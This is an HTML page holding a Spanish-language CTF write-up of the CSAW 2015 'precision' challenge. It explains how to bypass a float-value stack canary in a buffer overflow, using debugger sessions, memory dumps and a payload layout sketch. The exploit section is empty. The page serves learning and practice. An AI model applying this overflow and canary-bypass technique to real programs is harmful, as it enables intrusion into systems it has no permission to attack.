<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>
<body class="stackedit">
  <div class="stackedit__html">
  <pre><code>❯ ./rabbit_pwned

	                  .".
                         /  |
                        /  /
                       / ,"
           .-------.--- /
          ".____.-/ o. o\
                 (    Y  )
                  )     /
                 /     (
                /       Y
            .-"         |
           /  _     \    \
          /    `. ". ) /' )
         Y       )( / /(,/
        ,|      /     )
       (_|     /     /
          \_  (__   (__        
            "-._,)--._,)
</code></pre>
<p>Escrito por Alvaro M. aka <code><a href="https://twitter.com/naivenom">@naivenom</a></code>.</p>
<h2 id="indice">Indice</h2>
<h4 id="indice-exploiting">[Exploiting]</h4>
<p><a href="#refs_uno">1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros + float value(canary) + shellcode (I)</a></p>
<h2 id="introduccion">Introduccion</h2>
<p>Recomiendo que se tome este manual como una referencia y no una explicacion detallada de los retos que he ido realizando a lo largo del 2018. 
Realmente cada tecnica esta dividida en seis apartados con lo mas resañable e interesante a la hora de usar el Exploiting & Reversing Field Manual 2018 como una referencia y consulta a la hora de estar resolviendo un reto y ver la tecnica usada, los comandos usados, un breve resumen de un informe mas detallado y el codigo del exploit.
En la seccion de comandos solo me limito a poner el output del comando mas destacable, recomiendo que descarguen el binario y vean todo el contenido si lo requieren. No olviden que es un Field Manual y no tiene que ser extenso en cuanto a write-up de la tecnica, sino lo más importante y versatil para cuando se encuentren un problema de las mismas características.</p>
<h2><a id="refs_uno" href="#refs_uno"> 1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros + float value(canary) + shellcode</a></h2>
<h4>[Resumen]:</h4><p>Tenemos que explotar un Buffer Overflow protegido con un stack canary float value</p>
<h4>[Tecnica]:</h4><p>Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros + float value(canary) + shellcode</p>
<h4>[Informe]:</h4><p>Comenzamos analizando estaticamente el codigo desensamblado del binario. La funcion mas resañable donde se encuentra la vulnerabilidad es en el <code>main()</code>. 
En esta funcion una vez es llamada y configurar el stack en el prologo ejecuta una instruccion realizando floating load <code>fld qword [0x8048690]</code>.
Seguidamente carga el float value en el stack <code>fstp qword [esp + 0x98]</code>. Luego analizando el desensamblado del binario realiza una serie de llamadas a 
<code>printf()</code>, <code>scanf()</code> y probablemente tengamos un Buffer Overflow (BoF de ahora en adelante) despues de la funcion <code>scanf()</code> porque no controlora o checkeara cuantos caracteres o "junk" le enviemos en nuestro payload. 
Finalmente en el mismo bloque antes de llegar a un salto condicional y despues de ejecutar <code>scanf()</code> ejecuta la misma instruccion <code>fld qword [esp + 0x98]</code> realizando floating load donde previamente se escribio en el Stack y seguidamente ejecuta <code>fld qword [0x8048690]</code> siendo el original float value del calculo realizado en la FPU. Despues de estas dos instrucciones tan relevantes realiza <code>fucompi st(1)</code> comparando ambos valores. Por tanto esta comprobacion que se realiza cuando se ejecuta despues del prologo y antes del salto condicional es una especie de Stack Canary</p>
<p>Cuando debugeamos el binario y nos encontramos en la direccion de memoria <code>0x080485a3</code> y queremos desensamblar la direccion que contiene el float original value aparece su contenido, sin embargo si desensamblamos la direccion de memoria del stack <code>[esp+0x98]</code> podemos observar que su contenido es justo los valores <code>0x41414141</code> ya que con el data o "junk" que hemos enviado sobreescribe el float value y el stack canary nos lo detectara.</p>
<p>Seguidamente debemos saber donde esta localizada la direccion de memoria del float en el stack, y esta en los últimos 8 Bytes de <code>0xffda4c70</code>
<pre><code>❯ Ejemplo_                                                                         
Buffer:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + EIP
Smashing Float:    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + MEMORY ADDRESS que queremos controlar
                                                          
FUCOMPI:           AAAAAAAA != 0.245454   Security Detected!

Bypass:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + MEMORY ADDRESS
</code></pre>
<h4>[Comandos]:</h4><pre><code>❯ r2 -d precision                                                                            
[0x0804851d]> db 0x080485a3 #Colocamos un bp justo en la instruccion fucompi
[0x0804851d]> dc #Ejecutamos hasta el bp
Buff: 0xffa3d9e8
AAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 80485a3

[0x0804851d]> vpp #Entramos en visual mode
[0x080485a3 170 /home/naivenom/pwn/precision]> ?0;f tmp;s.. @ eip                                                                         
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF                                                                     
0xffa3d9d0  8286 0408 e8d9 a3ff 0200 0000 0000 0000  ................                                                                     
0xffa3d9e0  9c1a f3f7 0100 0000 4141 4141 4141 4141  ........AAAAAAAA                                                                     
0xffa3d9f0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA                                                                     
0xffa3da00  0000 0000 0000 c300 0000 0000 0010 f3f7  ................                                                                     
 eax 0x00000001      ebx 0x00000000      ecx 0x00000001      edx 0xf7ed689c                                                               
 esi 0xf7ed5000      edi 0x00000000      esp 0xffa3d9d0      ebp 0xffa3da78                                                               
 eip 0x080485a3      eflags 1ZI         oeax 0xffffffff                                                                                   
            ;-- eip:                                                                                                                      
|           0x080485a3 b    dfe9           fucompi st(1)                                                                                  
|           0x080485a5      ddd8           fstp st(0)

[0x080485a3]> px@esp+0x98 #Desensamblado de la dirección de memoria correspondiente a esp+0x98
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffa3da68  a531 5a47 5515 5040 0050 edf7 0050 edf7  .1ZGU.P@.P...P..

</code></pre>
<pre><code>❯ gdb -q precision 
Reading symbols from precision...(no debugging symbols found)...done.
gdb-peda$ break *main
Breakpoint 1 at 0x804851d
gdb-peda$ break *0x080485a3
Breakpoint 2 at 0x80485a3
gdb-peda$ r
Starting program: /home/naivenom/pwn/precision 
Breakpoint 1, 0x0804851d in main ()
gdb-peda$ c
Continuing.
Buff: 0xffffd238
AAAAAAAAAA #Vamos a enviar poco contenido para no sobreescribir el float value en el stack
Breakpoint 2, 0x080485a3 in main ()
gdb-peda$ info float
  R7: Valid   0x400580aaaa3ad18d2800 +64.33333000000000368      
=>R6: Valid   0x400580aaaa3ad18d2800 +64.33333000000000368  
gdb-peda$ x/wx 0x8048690
0x8048690:	0x475a31a5
gdb-peda$ x/wx $esp+0x98
0xffffd2b8:	0x475a31a5
</code></pre>
<pre><code>❯ r2 -d precision  
[0x0804851d]> db 0x080485a3
[0x0804851d]> dc
Buff: 0xfff92198
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
hit breakpoint at: 80485a3
[0x080485a3]> px@esp+0x98 #Desensamblamos la direccion de memoria para ver el contenido, y smashing stack! Sobreescribimos float
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xfff92218  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92228  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92238  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0xfff92248  4141 4141 4100 eef7 0040 f0f7 0000 0000  AAAAA....@......
</code></pre>
<pre><code>
[0x0804851d]> db 0x08048543
[0x0804851d]> dc
hit breakpoint at: 8048543
[0x0804851d]> px@esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffda4be0  0000 0000 8bcf f5f7 2082 0408 0000 0000  ........ .......
0xffda4bf0  9caa f7f7 0100 0000 10c4 f4f7 0100 0000  ................
0xffda4c00  0000 0000 0100 0000 40a9 f7f7 c200 0000  ........@.......
0xffda4c10  0000 0000 0000 c300 0000 0000 00a0 f7f7  ................
0xffda4c20  0000 0000 0000 0000 0000 0000 00b3 8163  ...............c
0xffda4c30  0900 0000 6e54 daff a98f d7f7 4817 f2f7  ....nT......H...
0xffda4c40  00e0 f1f7 00e0 f1f7 0000 0000 8583 0408  ................
0xffda4c50  fce3 f1f7 0000 0000 00a0 0408 3286 0408  ............2...
0xffda4c60  0100 0000 244d daff 2c4d daff a591 d7f7  ....$M..,M......
0xffda4c70  a029 f6f7 0000 0000 a531 5a47 5515 5040  .).......1ZGU.P@
</code></pre>
<h4>[Exploit]:</h4><p></p>
<h4>[URL Reto]:</h4><p><a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/precision_a8f6f0590c177948fe06c76a1831e650">--Precision100 CSAW CTF 2015--</a></p>
<p>[Continuara...]</p>
</div>
</body>

</html>



